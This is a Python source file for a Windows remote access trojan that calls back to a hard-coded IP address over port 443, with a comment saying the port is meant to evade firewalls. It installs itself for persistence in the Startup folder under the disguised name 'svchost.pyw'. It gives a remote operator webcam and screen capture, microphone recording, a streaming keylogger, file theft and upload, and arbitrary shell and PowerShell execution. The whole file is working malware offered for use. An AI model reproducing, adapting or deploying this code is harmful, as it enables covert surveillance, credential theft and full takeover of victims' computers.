import socket
import subprocess
import random
import os
import sys
import getpass
import shutil
import platform
import uuid
from io import BytesIO

# === AUTO PERSISTENCE (Runs once when script starts) ===
def add_persistence():
    try:
        user = getpass.getuser()
        startup_folder = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        current_script = os.path.realpath(__file__)
        persistent_copy = os.path.join(startup_folder, "svchost.pyw")
        if not os.path.exists(persistent_copy):
            shutil.copyfile(current_script, persistent_copy)
    except: pass

# Run persistence immediately
add_persistence()

# === AUTO INSTALL MISSING MODULES ===
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try: import cv2
except: install("opencv-python")

try: from PIL import ImageGrab
except: install("pillow")

try: import sounddevice as sd; import wavio
except: install("sounddevice"); install("wavio"); install("scipy")

try: from pynput.keyboard import Listener
except: install("pynput")

# === FEATURES ===
def webcam_pic(s, data):
    cam = cv2.VideoCapture(0)
    result, image = cam.read()
    filename = f"{random.randint(100,999)}.png"
    if result:
        cv2.imwrite(filename, image)
        with open(filename, "rb") as f:
            while chunk := f.read(1024):
                s.send(chunk)
        s.send(b"Sended")
        cam.release()
        os.remove(filename)

def screenshot(s, data):
    buffer = BytesIO()
    img = ImageGrab.grab()
    img.save(buffer, format="PNG")
    buffer.seek(0)
    while chunk := buffer.read(1024):
        s.send(chunk)
    s.send(b"Sended")

def download(s, data):
    filename = s.recv(1024).decode("utf-8").strip()
    if os.path.exists(filename):
        with open(filename, "rb") as f:
            while chunk := f.read(1024):
                s.sendall(chunk)
        s.send(b"FILE_SENT")
    else:
        s.send(b"FILE_NOT_FOUND")

def upload(s, data):
    filename = data[7:].decode("utf-8").strip()
    with open(filename, "wb") as f:
        while True:
            filedata = s.recv(1024)
            if filedata.endswith(b"DONE"):
                f.write(filedata[:-4])
                break
            f.write(filedata)
    s.send(b"Upload completed")

def sysinfo(s, data):
    info = f"""
[+] System Information
OS: {platform.system()} {platform.release()}
Computer: {platform.node()}
User: {getpass.getuser()}
Processor: {platform.processor()}
MAC: {':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,48,8)][::-1])}
Path: {os.getcwd()}
"""
    s.sendall(info.encode())

def keylogger(s, data):
    def on_press(key):
        try:
            log = str(key).replace("'", "")
            s.sendall(log.encode() + b"\n")
        except: pass
    listener = Listener(on_press=on_press)
    listener.start()
    s.send(b"Keylogger started - press Ctrl+C on server to stop")

def microphone(s, data):
    duration = 10
    fs = 44100
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    wavio.write("temp_audio.wav", recording, fs, sampwidth=2)
    with open("temp_audio.wav", "rb") as f:
        while chunk := f.read(1024):
            s.send(chunk)
    s.send(b"Sended")
    os.remove("temp_audio.wav")

def shell_command(s, data, use_powershell=False):
    if data[:2].decode("utf-8") == "cd":
        try:
            os.chdir(data[3:].decode("utf-8"))
        except: pass
        s.sendall(str.encode(f"\n{os.getcwd()}> "))
        return

    cmd_list = ["powershell", "-Command", data.decode("utf-8")] if use_powershell else data.decode("utf-8")
    proc = subprocess.Popen(
        cmd_list,
        shell=not use_powershell,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE
    )
    output = proc.stdout.read() + proc.stderr.read()
    result = output.decode(errors="ignore") + f"\n{os.getcwd()}> "
    s.sendall(result.encode())

# === MAIN CONNECTION ===
def connect():
    s = socket.socket()
    host = "20.205.17.23"   # ← CHANGE THIS TO YOUR AZURE VM IP
    port = 443             # ← Using 443 to bypass firewalls
    while True:
        try:
            s.connect((host, port))
            choice = s.recv(1024).decode("utf-8")
            return choice, s
        except:
            time.sleep(5)  # retry every 5 seconds if offline

def main():
    import time
    choice, s = connect()
    while True:
        try:
            data = s.recv(32000)
            if not data: break

            cmd = data.decode("utf-8", errors="ignore")

            if choice == "CMD":
                if cmd.startswith("ss"): screenshot(s, data)
                elif cmd.startswith("webcam"): webcam_pic(s, data)
                elif cmd.startswith("download"): download(s, data)
                elif cmd.startswith("upload"): upload(s, data)
                elif cmd.startswith("sysinfo"): sysinfo(s, data)
                elif cmd.startswith("keylog"): keylogger(s, data)
                elif cmd.startswith("mic"): microphone(s, data)
                else: shell_command(s, data, use_powershell=False)

            elif choice == "PS":
                if cmd.startswith("ss"): screenshot(s, data)
                elif cmd.startswith("webcam"): webcam_pic(s, data)
                elif cmd.startswith("download"): download(s, data)
                elif cmd.startswith("upload"): upload(s, data)
                elif cmd.startswith("sysinfo"): sysinfo(s, data)
                elif cmd.startswith("keylog"): keylogger(s, data)
                elif cmd.startswith("mic"): microphone(s, data)
                else: shell_command(s, data, use_powershell=True)

        except Exception as e:
            pass
    s.close()

if __name__ == "__main__":
    main()